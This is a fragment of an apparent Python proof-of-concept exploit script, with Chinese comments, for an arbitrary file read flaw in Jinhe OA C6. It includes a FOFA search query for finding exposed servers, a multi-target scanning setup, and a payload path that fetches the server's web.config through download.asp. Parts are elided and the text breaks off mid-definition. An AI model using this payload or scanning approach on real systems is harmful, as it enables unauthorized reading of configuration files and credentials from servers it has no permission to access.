#金和 OA C6 任意文件读取漏洞
#fofa 查询语法：app="金和网络-金和OA"
import sys,requests,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    parse = argparse.ArgumentParser(description='金和 OA C6 任意文件读取漏洞')
    ...
    if args.url and not args.file:
        ...
        pass
def poc(target):
    payload="/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config"
    data=""
    proxy={
